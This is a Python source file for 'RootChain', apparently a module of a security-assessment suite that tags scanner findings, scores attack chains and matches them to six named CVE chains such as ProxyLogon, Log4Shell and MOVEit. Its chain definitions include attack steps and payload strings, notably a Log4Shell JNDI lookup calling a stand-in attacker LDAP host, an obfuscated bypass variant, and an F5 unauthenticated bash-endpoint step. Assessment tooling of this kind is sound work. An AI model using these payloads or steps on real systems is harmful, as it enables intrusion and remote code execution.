#!/usr/bin/env python3
"""
RootChain — Attack Chain Correlation Engine
Correlates findings from all modules into scored attack chains.
Includes 6 named chains: ProxyLogon, ProxyShell, SharePoint RCE,
Log4Shell, F5 BIG-IP, and MOVEit SQLi.
"""
import json
import os
import sys
from collections import defaultdict
from pathlib import Path

# Allow sibling imports when run as subprocess
sys.path.insert(0, str(Path(__file__).parent))

WEIGHTS = {
    'hidden_admin': 8, 'hidden_endpoint': 3, 'header_bypass': 7,
    'path_bypass': 6, 'possible_origin': 5, 'csp_weakness': 4,
    'missing_header': 3, 'cookie_no_secure': 3, 'cookie_no_httponly': 3,
    'cookie_no_samesite': 2, 'info_disclosure': 2, 'body_disclosure': 5,
    'internal_ip': 4, 'cors_wildcard': 7, 'cors_weakness': 7,
    'hsts_short': 2, 'blind_injection': 9, 'broken_auth': 10,
    'bola': 9, 'data_leak': 5, 'jwt_weakness': 7, 'token_leak': 8,
    'race_condition': 7, 'mass_assignment': 9, 'idor': 8,
    'crypto_weakness': 7, 'timing_attack': 5, 'config_exposure': 9,
    'ssrf': 10, 'exposed_service': 8, 'api_weakness': 5,
    'ssti': 10, 'deserialization': 10, 'cache_poison': 7,
    'prototype_pollution': 7, 'default_credentials': 10,
    'supply_chain': 6, 'framework_exposure': 7, 'oauth_weakness': 7,
}

MIN_CONFIDENCE_FOR_CHAIN = 50

# ─── 6 NAMED ATTACK CHAINS ────────────────────────────────────────────────────
NAMED_CHAINS = {
    "ProxyLogon": {
        "id":          "ProxyLogon",
        "name":        "ProxyLogon (Exchange Pre-Auth RCE)",
        "platform":    "Microsoft Exchange",
        "severity":    "CRITICAL",
        "cves":        ["CVE-2021-26855", "CVE-2021-26857", "CVE-2021-26858", "CVE-2021-27065"],
        "description": "Pre-auth SSRF (26855) allows reading emails and retrieving session tokens. "
                       "Combined with insecure deserialization (26857) leads to SYSTEM-level code "
                       "execution. Post-auth file write (26858, 27065) drops webshells.",
        "steps": [
            {"cve": "CVE-2021-26855", "action": "SSRF — read internal Exchange config, harvest session cookies"},
            {"cve": "CVE-2021-26857", "action": "Deserialization — execute arbitrary code as SYSTEM via Unified Messaging"},
            {"cve": "CVE-2021-26858", "action": "Post-auth write — write webshell to disk (OWA path)"},
            {"cve": "CVE-2021-27065", "action": "ECP file write — alternate webshell drop path"},
        ],
        "indicator_tags": ["ssrf", "deserialization", "hidden_admin", "config_exposure"],
        "indicator_keywords": ["owa", "exchange", "autodiscover", "ecp", "mapi"],
    },
    "ProxyShell": {
        "id":          "ProxyShell",
        "name":        "ProxyShell (Exchange URL Confusion → RCE)",
        "platform":    "Microsoft Exchange",
        "severity":    "CRITICAL",
        "cves":        ["CVE-2021-34473", "CVE-2021-34523", "CVE-2021-31207"],
        "description": "URL confusion in the Exchange front-end proxy (34473) lets an attacker "
                       "reach back-end endpoints without authentication. EAC RBAC bypass (34523) "
                       "grants admin role, and post-auth RCE (31207) deploys a webshell.",
        "steps": [
            {"cve": "CVE-2021-34473", "action": "URL confusion — reach back-end autodiscover without auth"},
            {"cve": "CVE-2021-34523", "action": "RBAC bypass — elevate to admin via EAC"},
            {"cve": "CVE-2021-31207", "action": "Post-auth RCE — write webshell via New-MailboxExportRequest"},
        ],
        "indicator_tags": ["broken_auth", "hidden_admin", "config_exposure"],
        "indicator_keywords": ["autodiscover", "exchange", "powershell", "webshell"],
    },
    "SharePoint_RCE": {
        "id":          "SharePoint_RCE",
        "name":        "SharePoint Pre-Auth RCE (2023)",
        "platform":    "Microsoft SharePoint",
        "severity":    "CRITICAL",
        "cves":        ["CVE-2023-29357", "CVE-2023-24955"],
        "description": "Auth bypass via spoofed JWT (29357) grants admin access without credentials. "
                       "Authenticated RCE (24955) then achieves SYSTEM-level code execution via "
                       "server-side injection in Site pages.",
        "steps": [
            {"cve": "CVE-2023-29357", "action": "JWT spoof — gain admin session without credentials"},
            {"cve": "CVE-2023-24955", "action": "Authenticated RCE — inject and execute server-side code"},
        ],
        "indicator_tags": ["broken_auth", "ssti", "jwt_weakness", "hidden_admin"],
        "indicator_keywords": ["sharepoint", "_layouts", "_api", "spsite"],
    },
    "Log4Shell": {
        "id":          "Log4Shell",
        "name":        "Log4Shell (Log4j JNDI RCE Chain)",
        "platform":    "Apache Log4j (any Java app)",
        "severity":    "CRITICAL",
        "cves":        ["CVE-2021-44228", "CVE-2021-45046", "CVE-2021-45105"],
        "description": "JNDI injection in any header/parameter processed by Log4j 2.x (44228) "
                       "enables remote code execution by fetching a malicious LDAP/RMI payload. "
                       "45046 bypasses early mitigations. 45105 enables denial-of-service via "
                       "recursive lookup.",
        "steps": [
            {"cve": "CVE-2021-44228", "action": "JNDI injection — ${jndi:ldap://attacker/a} in any logged input"},
            {"cve": "CVE-2021-45046", "action": "Context-lookup bypass — evades early ${jndi:} block patches"},
            {"cve": "CVE-2021-45105", "action": "Recursive-lookup DoS — ${${::-j}ndi:...} causes infinite loop"},
        ],
        "indicator_tags": ["ssti", "config_exposure", "framework_exposure"],
        "indicator_keywords": ["jndi", "log4j", "ldap", "${", "lookup"],
    },
    "F5_BIG_IP": {
        "id":          "F5_BIG_IP",
        "name":        "F5 BIG-IP iControl Auth Bypass → Bash RCE",
        "platform":    "F5 BIG-IP",
        "severity":    "CRITICAL",
        "cves":        ["CVE-2022-1388"],
        "description": "Authentication bypass in the iControl REST interface (1388) allows "
                       "unauthenticated HTTP requests to be treated as admin. An attacker "
                       "can immediately execute arbitrary bash commands as root.",
        "steps": [
            {"cve": "CVE-2022-1388", "action": "Auth bypass — send iControl REST request with spoofed Connection header"},
            {"cve": None,            "action": "Bash RCE — POST /mgmt/tm/util/bash with arbitrary command"},
        ],
        "indicator_tags": ["broken_auth", "default_credentials", "exposed_service"],
        "indicator_keywords": ["big-ip", "icontrol", "f5", "tmsh", "tmos"],
    },
    "MOVEit": {
        "id":          "MOVEit",
        "name":        "MOVEit SQLi → Webshell Drop",
        "platform":    "Progress MOVEit Transfer",
        "severity":    "CRITICAL",
        "cves":        ["CVE-2023-34362", "CVE-2023-35036", "CVE-2023-35708"],
        "description": "SQL injection in MOVEit Transfer web application (34362) allows "
                       "unauthenticated attackers to extract credentials and session tokens. "
                       "Attackers then drop an ASPX webshell for persistent SYSTEM access.",
        "steps": [
            {"cve": "CVE-2023-34362", "action": "SQLi — extract db_owner credentials from SQL Server via stacked queries"},
            {"cve": "CVE-2023-35036", "action": "Auth bypass — use harvested token to authenticate as admin"},
            {"cve": "CVE-2023-35708", "action": "Privilege escalation — elevate SQL user to sysadmin, drop webshell"},
        ],
        "indicator_tags": ["blind_injection", "broken_auth", "config_exposure", "data_leak"],
        "indicator_keywords": ["moveit", "human.aspx", "guestaccess", "MOVEit Transfer"],
    },
}


def load(path):
    if not os.path.exists(path):
        return []
    try:
        with open(path) as f:
            return json.load(f)
    except Exception:
        return []


def get_confidence(item):
    return item.get('data', {}).get('confidence', 50)


def _tag(src, asset, tag, item):
    return {'src': src, 'asset': asset, 'tag': tag, 'data': item}


def tag_ghost(items):
    out = []
    for it in items:
        path = (it.get('path') or '').lower()
        tag = 'hidden_admin' if any(k in path for k in [
            'admin', 'config', 'debug', '.git', '.env',
            'actuator', 'console', 'phpmy', 'swagger',
            'graphql', 'jenkins', 'secret', 'credential'
        ]) else 'hidden_endpoint'
        out.append(_tag('GhostCrawler', it.get('path'), tag, it))
    return out


def tag_waf(items):
    return [_tag('WAFShatter',
                 it.get('url') or it.get('path') or it.get('host'),
                 it.get('type', 'header_bypass'), it) for it in items]


def tag_header(items):
    return [_tag('HeaderForge', it.get('header', '/'), it.get('type', 'missing_header'), it)
            for it in items]


def tag_time(items):
    return [_tag('TimeBleed', it.get('param'), 'blind_injection', it) for it in items]


def tag_auth(items):
    out = []
    for it in items:
        sev = it.get('severity', '')
        tag = 'broken_auth' if sev == 'CRITICAL' else ('bola' if sev == 'HIGH' else 'data_leak')
        out.append(_tag('AuthDrift', it.get('url'), tag, it))
    return out


def tag_tokens(items):
    out = []
    for it in items:
        issues = it.get('issues', [])
        has_critical = any(i.get('severity') == 'CRITICAL' for i in issues)
        sev = it.get('severity', '')
        tag = 'token_leak' if (sev == 'CRITICAL' or has_critical) else 'jwt_weakness'
        out.append(_tag('TokenSniper', it.get('source'), tag, it))
    return out


def tag_deep(items):
    out = []
    for it in items:
        t = it.get('type', '').lower()
        if 'race' in t:
            tag = 'race_condition'
        elif 'mass' in t:
            tag = 'mass_assignment'
        elif 'idor' in t:
            tag = 'idor'
        elif 'ssrf' in t:
            tag = 'ssrf'
        else:
            tag = 'api_weakness'
        out.append(_tag('DeepLogic', it.get('endpoint'), tag, it))
    return out


def tag_crypto(items):
    out = []
    for it in items:
        t = it.get('type', '').lower()
        if 'timing' in t:
            tag = 'timing_attack'
        elif 'weak' in t or 'algo' in t:
            tag = 'crypto_weakness'
        elif 'jwt' in t:
            tag = 'jwt_weakness'
        else:
            tag = 'crypto_weakness'
        out.append(_tag('CryptoHunter', it.get('url'), tag, it))
    return out


def tag_backend(items):
    out = []
    for it in items:
        t = it.get('type', '').lower()
        if 'ssti' in t:
            tag = 'ssti'
        elif 'deserializ' in t:
            tag = 'deserialization'
        elif 'ssrf' in t:
            tag = 'ssrf'
        elif 'cache' in t:
            tag = 'cache_poison'
        elif 'proto' in t:
            tag = 'prototype_pollution'
        elif 'default' in t or 'cred' in t:
            tag = 'default_credentials'
        elif 'supply' in t:
            tag = 'supply_chain'
        elif 'framework' in t:
            tag = 'framework_exposure'
        elif 'config' in t or 'exposure' in t:
            tag = 'config_exposure'
        elif 'service' in t:
            tag = 'exposed_service'
        else:
            tag = 'api_weakness'
        out.append(_tag('BackendProbe', it.get('url'), tag, it))
    return out


def tag_web(items):
    out = []
    for it in items:
        t = it.get('type', '').lower()
        if 'cache' in t:
            tag = 'cache_poison'
        elif 'proto' in t:
            tag = 'prototype_pollution'
        elif 'cors' in t:
            tag = 'cors_wildcard'
        elif 'oauth' in t:
            tag = 'oauth_weakness'
        else:
            tag = 'api_weakness'
        out.append(_tag('WebProbe', it.get('url'), tag, it))
    return out


def tag_cveprobe(items):
    """Tag CVEProbe findings for chain correlation."""
    out = []
    for it in items:
        sev = it.get('severity', 'MEDIUM')
        cve = it.get('cve', '')
        # Map to a tag
        if sev == 'CRITICAL':
            tag = 'broken_auth'
        elif 'ssrf' in it.get('name', '').lower():
            tag = 'ssrf'
        elif 'deserializ' in it.get('name', '').lower():
            tag = 'deserialization'
        elif 'injection' in it.get('name', '').lower():
            tag = 'blind_injection'
        else:
            tag = 'config_exposure'
        out.append(_tag('CVEProbe', it.get('url', ''), tag, {**it, 'confidence': 80}))
    return out


# ─── Named chain detection ────────────────────────────────────────────────────

def detect_named_chains(all_tagged, cveprobe_findings=None):
    """
    Check findings against the 6 named attack chains.
    Returns list of triggered chains with matched evidence.
    """
    triggered = []
    cve_findings = cveprobe_findings or []
    found_cves = {f.get('cve') for f in cve_findings}

    # Flatten all finding text for keyword search
    all_text = " ".join(str(t.get('asset', '')) + " " + str(t.get('tag', ''))
                        for t in all_tagged).lower()
    all_tags  = {t.get('tag') for t in all_tagged}

    for chain_id, chain in NAMED_CHAINS.items():
        score = 0
        evidence = []

        # Check CVE matches (cveprobe)
        matched_cves = [c for c in chain['cves'] if c in found_cves]
        if matched_cves:
            score += len(matched_cves) * 30
            for cve in matched_cves:
                ev = next((f for f in cve_findings if f.get('cve') == cve), None)
                if ev:
                    evidence.append({'source': 'CVEProbe', 'cve': cve,
                                     'url': ev.get('url', ''), 'match': 'CVE confirmed'})

        # Check indicator tags
        matched_tags = [t for t in chain.get('indicator_tags', []) if t in all_tags]
        if matched_tags:
            score += len(matched_tags) * 10
            for t in matched_tags:
                finding = next((f for f in all_tagged if f.get('tag') == t), None)
                evidence.append({'source': finding.get('src') if finding else 'unknown',
                                 'tag': t, 'match': 'indicator tag'})

        # Check indicator keywords
        matched_kw = [k for k in chain.get('indicator_keywords', [])
                      if k.lower() in all_text]
        if matched_kw:
            score += len(matched_kw) * 5

        if score >= 30:
            triggered.append({
                'chain':       chain_id,
                'name':        chain['name'],
                'platform':    chain['platform'],
                'severity':    chain['severity'],
                'cves':        chain['cves'],
                'description': chain['description'],
                'steps':       chain['steps'],
                'score':       min(score, 100),
                'evidence':    evidence,
                'matched_cves': matched_cves,
            })

    return triggered


# ─── Generic chain correlation ────────────────────────────────────────────────

def score_chains(tagged):
    by_tag = defaultdict(list)
    for t in tagged:
        conf = get_confidence(t['data'])
        if conf >= MIN_CONFIDENCE_FOR_CHAIN:
            by_tag[t['tag']].append(t)

    chains = []

    # Auth → Privilege escalation
    if by_tag.get('broken_auth') or by_tag.get('bola'):
        auth_items = by_tag.get('broken_auth', []) + by_tag.get('bola', [])
        chain_items = auth_items[:]
        chain_score = sum(WEIGHTS.get(t['tag'], 0) for t in auth_items)
        priv_items = by_tag.get('mass_assignment', []) + by_tag.get('idor', [])
        if priv_items:
            chain_score += sum(WEIGHTS.get(t['tag'], 0) for t in priv_items)
            chain_items += priv_items
        if chain_score > 0:
            chains.append({
                'name':  'Auth Bypass → Privilege Escalation',
                'score': min(chain_score * 3, 100),
                'tags':  list({t['tag'] for t in chain_items}),
                'items': chain_items[:5],
            })

    # Token theft → Account takeover
    if by_tag.get('token_leak') or by_tag.get('jwt_weakness'):
        t_items = by_tag.get('token_leak', []) + by_tag.get('jwt_weakness', [])
        score = sum(WEIGHTS.get(t['tag'], 0) for t in t_items)
        if score > 0:
            chains.append({
                'name':  'Token Theft → Account Takeover',
                'score': min(score * 4, 100),
                'tags':  list({t['tag'] for t in t_items}),
                'items': t_items[:5],
            })

    # Injection → RCE
    if by_tag.get('blind_injection') or by_tag.get('ssti') or by_tag.get('deserialization'):
        inj = (by_tag.get('blind_injection', []) + by_tag.get('ssti', [])
               + by_tag.get('deserialization', []))
        score = sum(WEIGHTS.get(t['tag'], 0) for t in inj)
        if score > 0:
            chains.append({
                'name':  'Injection → Remote Code Execution',
                'score': min(score * 3, 100),
                'tags':  list({t['tag'] for t in inj}),
                'items': inj[:5],
            })

    # SSRF → Internal pivot
    if by_tag.get('ssrf'):
        ssrf_items = by_tag['ssrf']
        score = sum(WEIGHTS.get(t['tag'], 0) for t in ssrf_items)
        internal = by_tag.get('internal_ip', []) + by_tag.get('config_exposure', [])
        if internal:
            score += sum(WEIGHTS.get(t['tag'], 0) for t in internal)
        if score > 0:
            chains.append({
                'name':  'SSRF → Internal Network Pivot',
                'score': min(score * 3, 100),
                'tags':  list({t['tag'] for t in ssrf_items + internal}),
                'items': (ssrf_items + internal)[:5],
            })

    # WAF bypass → exploitation
    if by_tag.get('header_bypass') or by_tag.get('path_bypass'):
        bypass = by_tag.get('header_bypass', []) + by_tag.get('path_bypass', [])
        exploit = (by_tag.get('blind_injection', []) + by_tag.get('broken_auth', [])
                   + by_tag.get('ssrf', []))
        if bypass and exploit:
            score = sum(WEIGHTS.get(t['tag'], 0) for t in bypass + exploit)
            chains.append({
                'name':  'WAF Bypass → Exploitation',
                'score': min(score * 2, 100),
                'tags':  list({t['tag'] for t in bypass + exploit}),
                'items': (bypass + exploit)[:5],
            })

    return chains


def build_risk(tagged, chains):
    weights = [WEIGHTS.get(t['tag'], 1) * (get_confidence(t['data']) / 100)
               for t in tagged]
    raw = sum(weights)
    norm = min(int(raw * 2.5), 100)

    chain_bonus = sum(min(c.get('score', 0) * 0.3, 20) for c in chains)
    final = min(int(norm + chain_bonus), 100)

    if final >= 80:
        level = 'CRITICAL'
    elif final >= 60:
        level = 'HIGH'
    elif final >= 40:
        level = 'MEDIUM'
    else:
        level = 'LOW'

    return {'score': final, 'level': level}


def top_findings(tagged, n=10):
    scored = sorted(tagged, key=lambda t: (WEIGHTS.get(t['tag'], 0) *
                                           get_confidence(t['data']) / 100), reverse=True)
    return scored[:n]


def main():
    base = os.path.dirname(os.path.abspath(__file__))
    rep  = os.path.join(base, '..', 'reports')

    ghost   = load(os.path.join(rep, 'ghostcrawler.json'))
    waf     = load(os.path.join(rep, 'wafshatter.json'))
    header  = load(os.path.join(rep, 'headerforge.json'))
    time_   = load(os.path.join(rep, 'timebleed.json'))
    auth    = load(os.path.join(rep, 'authdrift.json'))
    tokens  = load(os.path.join(rep, 'tokensniper.json'))
    deep    = load(os.path.join(rep, 'deeplogic.json'))
    crypto  = load(os.path.join(rep, 'cryptohunter.json'))
    backend = load(os.path.join(rep, 'backendprobe.json'))
    web     = load(os.path.join(rep, 'webprobe.json'))
    cve     = load(os.path.join(rep, 'cveprobe.json'))

    tagged = (
        tag_ghost(ghost)   + tag_waf(waf)     + tag_header(header)  +
        tag_time(time_)    + tag_auth(auth)    + tag_tokens(tokens)  +
        tag_deep(deep)     + tag_crypto(crypto) + tag_backend(backend) +
        tag_web(web)       + tag_cveprobe(cve)
    )

    print(f"\n[*] RootChain — {len(tagged)} tagged findings")

    generic_chains = score_chains(tagged)
    named_chains   = detect_named_chains(tagged, cve_findings=cve)

    print(f"[+] Generic chains: {len(generic_chains)}")
    print(f"[+] Named chains triggered: {len(named_chains)}")
    for nc in named_chains:
        print(f"    ► {nc['name']} (score={nc['score']}) CVEs: {', '.join(nc['cves'])}")

    risk   = build_risk(tagged, generic_chains + named_chains)
    top    = top_findings(tagged)

    report = {
        'risk':          risk,
        'attack_chains': generic_chains + named_chains,
        'named_chains':  named_chains,
        'top_findings':  top,
        'total_tagged':  len(tagged),
        'sources': {
            'ghostcrawler': len(ghost),   'wafshatter':  len(waf),
            'headerforge':  len(header),  'timebleed':   len(time_),
            'authdrift':    len(auth),    'tokensniper': len(tokens),
            'deeplogic':    len(deep),    'cryptohunter':len(crypto),
            'backendprobe': len(backend), 'webprobe':    len(web),
            'cveprobe':     len(cve),
        },
    }

    out_path = os.path.join(rep, 'rootchain_report.json')
    with open(out_path, 'w') as f:
        json.dump(report, f, indent=2)

    print(f"\n[+] Risk score : {risk['score']}/100 ({risk['level']})")
    print(f"[+] Report saved: {out_path}")


if __name__ == '__main__':
    main()
